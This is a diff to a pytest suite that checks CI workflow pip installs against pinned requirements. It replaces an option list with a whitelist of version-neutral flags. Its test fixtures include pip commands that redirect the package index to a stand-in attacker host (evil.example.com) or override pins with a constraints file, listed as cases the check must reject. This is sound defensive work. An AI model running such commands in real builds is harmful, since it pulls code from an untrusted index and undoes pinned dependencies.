@@ -15,6 +15,9 @@ The rule they enforce is deliberately shaped so it needs no list of its own:
   * it may name no package of its own, pinned or not — a name on the command
     line is a second place a version can live, or a dependency nobody
     declared;
+  * it may pass only options that cannot change which version pip resolves,
+    and the table of those is a whitelist, so an option this file has never
+    heard of fails rather than being skipped;
   * so a package added to requirements-dev.txt is covered the moment it is
     added, and nothing here has to be widened to notice it.
 
@@ -107,22 +110,38 @@ ASSIGNMENT = re.compile(r"[A-Za-z_][A-Za-z0-9_]*=")
 # running `install` under one of those cannot be placed.
 RESOLVABLE_PROGRAM = re.compile(r"[A-Za-z0-9_@.+:/=-]+")
 
-# pip options that consume the following token. Not the whole of pip's CLI —
-# only enough that a value never gets mistaken for a package name. An option
-# missing from here whose value happens not to start with `-` is read as a
-# package operand and FAILS the test, which is the safe direction: the fix is
-# to add the option here, and the alternative would be to skip unknown tokens
-# and let a real package name through with them.
-VALUE_OPTIONS = {
-    "-r", "--requirement", "-c", "--constraint", "-t", "--target",
-    "-e", "--editable", "-i", "--index-url", "--extra-index-url",
-    "-f", "--find-links", "--python-version", "--platform", "--abi",
-    "--implementation", "--prefix", "--root", "--src", "--upgrade-strategy",
-    "--no-binary", "--only-binary", "--progress-bar", "--cache-dir", "--log",
-    "--proxy", "--retries", "--timeout", "--exists-action", "--trusted-host",
-    "--client-cert", "--cert", "--report", "--config-settings", "-C",
-}
-REQUIREMENT_OPTIONS = {"-r", "--requirement"}
+# THE OPTION TABLE IS A WHITELIST, and the entry test for it is one question:
+# can this option change WHICH VERSION pip ends up installing, or where it
+# comes from? If it can, it does not belong here. An earlier version of this
+# table listed options so their values would not be mistaken for package
+# names, which meant `-c constraints.txt` was consumed and waved through —
+# and a constraints file beats the requirements file, so `pyyaml==6.0.1` in
+# constraints.txt overrides `pyyaml==6.0.3` in requirements-dev.txt. Measured
+# on this branch at 2330e9c: `pip install -r requirements-dev.txt -c
+# constraints.txt` and `--index-url https://evil.example.com/simple` both
+# passed green. A whitelist fails an option it has never heard of, so a future
+# pip option that redirects a pin has to be looked at by a person before it
+# can be used here.
+#
+# Options with no value, none of which change what pip resolves — they change
+# how loud it is, where it puts the result, or whether it reads config.
+VERSION_NEUTRAL_FLAGS = frozenset({
+    "-q", "-qq", "-qqq", "--quiet",
+    "-v", "-vv", "-vvv", "--verbose",
+    "--no-color", "--no-input", "--no-cache-dir", "--isolated",
+    "--disable-pip-version-check", "--no-python-version-warning",
+    "--no-warn-script-location", "--no-warn-conflicts",
+    "--require-virtualenv", "--user", "--break-system-packages",
+    "--force-reinstall",
+})
+# Options that consume the following token, and whose value is a path, a
+# number or a display setting rather than anything pip resolves against.
+VERSION_NEUTRAL_VALUE_OPTIONS = frozenset({
+    "--progress-bar", "--cache-dir", "--log", "--retries", "--timeout",
+})
+# `-r` is the point of the whole file, so it is read rather than skipped: the
+# file it names is checked against the declared one.
+REQUIREMENT_OPTIONS = frozenset({"-r", "--requirement"})
 
 
 def canonical(name: str) -> str:
@@ -304,28 +323,40 @@ def scan_workflows():
 
 
 def install_operands(args):
-    """(requirement files, package operands) for the args of one install."""
-    requirement_files, packages = [], []
+    """(requirement files, package operands, rejected options) for one install.
+
+    A rejected option is one that is not on the whitelist above, whether pip
+    has it today or grows it tomorrow. Parsing does not try to guess whether
+    such an option takes a value, so the token after it may land in the
+    package list — which is why the package check defers to the option check
+    on a command that has any.
+    """
+    requirement_files, packages, rejected = [], [], []
     skip_next = False
     for i, token in enumerate(args):
         if skip_next:
             skip_next = False
             continue
-        if token in REQUIREMENT_OPTIONS:
-            if i + 1 < len(args):
-                requirement_files.append(args[i + 1])
-            skip_next = True
-        elif token.startswith("--requirement="):
-            requirement_files.append(token.split("=", 1)[1])
-        elif token.startswith("-r") and len(token) > 2:
+        name, equals, value = token.partition("=")
+        if token.startswith("-r") and not token.startswith("--") and len(token) > 2:
             requirement_files.append(token[2:])
-        elif token in VALUE_OPTIONS:
-            skip_next = True
-        elif token.startswith("-"):
+        elif name in REQUIREMENT_OPTIONS:
+            if equals:
+                requirement_files.append(value)
+            elif i + 1 < len(args):
+                requirement_files.append(args[i + 1])
+                skip_next = True
+            else:
+                rejected.append(f"{token} (with no file after it)")
+        elif name in VERSION_NEUTRAL_VALUE_OPTIONS:
+            skip_next = not equals
+        elif token in VERSION_NEUTRAL_FLAGS:
             continue
+        elif token.startswith("-"):
+            rejected.append(token)
         else:
             packages.append(token)
-    return requirement_files, packages
+    return requirement_files, packages, rejected
 
 
 ALL_INSTALLS, UNPLACEABLE = scan_workflows()
@@ -363,7 +394,7 @@ def test_no_workflow_command_that_might_be_a_pip_install_is_left_unplaced():
 @pytest.mark.parametrize("where, command, args", INSTALL_CASES, ids=INSTALL_IDS)
 def test_a_workflow_install_reads_the_declared_requirements_file(
         where, command, args):
-    files, _ = install_operands(args)
+    files, _, _ = install_operands(args)
     assert files, (
         f"{where} runs `{command}` without `-r`. Every workflow install has "
         f"to read requirements-dev.txt so the version it gets is the declared "
@@ -381,6 +412,25 @@ def test_a_workflow_install_reads_the_declared_requirements_file(
 
 
 @pytest.mark.parametrize("where, command, args", INSTALL_CASES, ids=INSTALL_IDS)
+def test_a_workflow_install_uses_no_option_that_can_change_the_version(
+        where, command, args):
+    """`-r requirements-dev.txt` only states the pins; several pip options
+    override them. A constraints file wins over a requirements file, and an
+    index option moves where every pin resolves from, so an install carrying
+    one of those reads the declared set and installs something else."""
+    _, _, rejected = install_operands(args)
+    assert not rejected, (
+        f"{where} runs `{command}`, which passes {rejected} — not on the "
+        f"whitelist of options that cannot change which version pip installs. "
+        f"A constraints file overrides the requirements pin and an index "
+        f"option moves where it resolves from, so an option here can undo "
+        f"requirements-dev.txt without changing a line of it. If the option "
+        f"genuinely cannot change the resolved version, add it to "
+        f"VERSION_NEUTRAL_FLAGS or VERSION_NEUTRAL_VALUE_OPTIONS and say why."
+    )
+
+
+@pytest.mark.parametrize("where, command, args", INSTALL_CASES, ids=INSTALL_IDS)
 def test_a_workflow_install_names_no_package_of_its_own(where, command, args):
     """The drift check proper, and the one that reads the declared set.
 
@@ -389,8 +439,11 @@ def test_a_workflow_install_names_no_package_of_its_own(where, command, args):
     the same way whether the workflow disagrees with the file, duplicates it,
     or installs something the file has never heard of.
     """
-    _, packages = install_operands(args)
-    if not packages:
+    _, packages, rejected = install_operands(args)
+    if not packages or rejected:
+        # An option the whitelist rejects may swallow the token after it, so a
+        # bare token here can be that value rather than a package. The options
+        # check is the one that reports such a command.
         return
     declared = declared_requirements()
     detail = []
@@ -511,7 +564,7 @@ def test_the_recogniser_sees_an_install_however_it_is_wrapped(body):
     found, unplaceable = scan_shell_body(body)
     assert not unplaceable, unplaceable
     assert len(found) == 1, found
-    _, packages = install_operands(found[0][1])
+    _, packages, _ = install_operands(found[0][1])
     assert packages == ["pyyaml==6.0.1"], found
 
 
@@ -570,4 +623,50 @@ def test_a_continued_install_is_one_command():
         "python3 -m pip install --quiet \\\n  -r requirements-dev.txt")
     assert not unplaceable
     assert [install_operands(args) for _, args in found] == [
-        (["requirements-dev.txt"], [])]
+        (["requirements-dev.txt"], [], [])]
+
+
+VERSION_CHANGING_OPTIONS = [
+    "python3 -m pip install -r requirements-dev.txt -c constraints.txt",
+    "python3 -m pip install -r requirements-dev.txt --constraint=constraints.txt",
+    "python3 -m pip install -r requirements-dev.txt -i https://evil.example.com/simple",
+    "python3 -m pip install -r requirements-dev.txt --index-url https://evil.example.com/simple",
+    "python3 -m pip install -r requirements-dev.txt --extra-index-url https://evil.example.com/simple",
+    "python3 -m pip install -r requirements-dev.txt -f ./wheels",
+    "python3 -m pip install -r requirements-dev.txt --pre",
+    "python3 -m pip install -r requirements-dev.txt --no-deps",
+    "python3 -m pip install -r requirements-dev.txt --trusted-host evil.example.com",
+    "python3 -m pip install -r requirements-dev.txt --an-option-pip-grows-later",
+]
+
+
+@pytest.mark.parametrize("body", VERSION_CHANGING_OPTIONS)
+def test_an_option_that_can_override_the_pins_is_rejected(body):
+    """Every one of these reads requirements-dev.txt and can still install a
+    version it does not name; the last is the whitelist's whole point, since
+    no table written today knows what pip will grow."""
+    found, unplaceable = scan_shell_body(body)
+    assert not unplaceable and len(found) == 1, (found, unplaceable)
+    _, _, rejected = install_operands(found[0][1])
+    assert rejected, body
+
+
+VERSION_NEUTRAL_INSTALLS = [
+    "python3 -m pip install --quiet -r requirements-dev.txt",
+    "python3 -m pip install -r requirements-dev.txt --no-cache-dir",
+    "python3 -m pip install --progress-bar off -r requirements-dev.txt",
+    "python3 -m pip install --progress-bar=off -r requirements-dev.txt",
+    "python3 -m pip install --requirement=requirements-dev.txt",
+    "python3 -m pip install -rrequirements-dev.txt",
+]
+
+
+@pytest.mark.parametrize("body", VERSION_NEUTRAL_INSTALLS)
+def test_the_whitelist_still_admits_an_install_that_changes_no_version(body):
+    """The whitelist has to leave the shapes these workflows use, and the ones
+    a reviewer would reasonably reach for, able to pass — a check nothing can
+    satisfy gets deleted rather than obeyed."""
+    found, unplaceable = scan_shell_body(body)
+    assert not unplaceable and len(found) == 1, (found, unplaceable)
+    files, packages, rejected = install_operands(found[0][1])
+    assert (files, packages, rejected) == (["requirements-dev.txt"], [], [])
